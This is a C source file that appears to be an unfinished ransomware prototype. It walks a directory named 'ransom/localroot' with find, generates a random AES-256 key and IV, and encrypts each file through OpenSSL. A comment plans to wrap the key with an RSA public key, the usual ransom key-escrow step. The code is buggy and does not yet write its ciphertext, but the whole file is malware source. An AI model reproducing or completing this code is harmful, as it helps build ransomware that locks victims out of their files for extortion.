#include <stdio.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <string.h>
#include <math.h>

#define MAX_COMMAND 1024
#define KEY_SIZE 256
#define IV_SIZE 16
#define BUFFER_SIZE 1024

void handleErrors() {
    exit(1);
}


int encrypt(char buffer[MAX_COMMAND], unsigned char key[KEY_SIZE / 8], unsigned char iv[IV_SIZE]) {

    printf("\n NOW IN ENCRYPT FUNCTION \n");
    printf("buffer: %s\n", buffer);
    printf("key: %s\n", key);
    printf("iv: %s\n", iv);

    // !CHECK SIZE OF EACH FILE

    FILE *input_file = fopen(buffer, "rb");

    if (input_file == NULL) {

        printf("Couldn't Open %s, PepeSadge...", buffer);

        return(-1);

    }

    fseek(input_file, 0, SEEK_END);

    int input_file_size = ftell(input_file);

    printf("file size: %d bytes\n", input_file_size);

    fseek(input_file, 0, SEEK_SET);

    // DIVIDE EACH BY 16 BYTES

    int blocks2enc = input_file_size / 16;

    printf("blocks to encrypt: %d\n\n", blocks2enc);

    // USE THAT NUMBER TO LOOP THE UPDATE ENCRYPT FUNCTION

    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;

    if(!(ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }
    
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        handleErrors();
    }

    unsigned char last_out_buffer[2 * BUFFER_SIZE];

    for (int x = 0; x < blocks2enc; x++) {
        
        unsigned char in_buffer[2 * BUFFER_SIZE];
        unsigned char out_buffer[2 * BUFFER_SIZE];

        fread(in_buffer, sizeof(unsigned char), BUFFER_SIZE, input_file);

        if(1 != EVP_EncryptUpdate(ctx, out_buffer, &len, in_buffer, strlen(in_buffer))) {
            handleErrors();
        }
        ciphertext_len += len;

        printf("outbuffer %d: %s", x, out_buffer);
    }

    if(1 != EVP_EncryptFinal_ex(ctx, last_out_buffer, &len)) {
    
        handleErrors();
    
    }

    ciphertext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    fclose(input_file);
    
    return 0;

}

int main() {
    char command[MAX_COMMAND];
    char buffer[MAX_COMMAND];

    // Construct the find command
    snprintf(command, sizeof(command), "find /home/nixiuff/Desktop/ransom/localroot -type f");

    // Open a pipe to the command
    FILE *pipe = popen(command, "r");
    if (pipe == NULL) {
        perror("popen failed");
        return 1;
    }

    unsigned char key[KEY_SIZE / 8];
    unsigned char iv[IV_SIZE];
    
    // ! encrypt the key using a rsa public key and iv and put it into a txt file



    if (RAND_bytes(key, sizeof(key)) != 1 || RAND_bytes(iv, sizeof(iv)) != 1) {
        handleErrors();
    }
    
    // Read the output of the command line by line and store it in a variable
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        // Do something with the file path (e.g., store it in an array)
        //
        //
        buffer[strlen(buffer) - 1] = '\0';

        encrypt(buffer, key, iv);
    }

    // Close the pipe
    pclose(pipe);

    return 0;
}
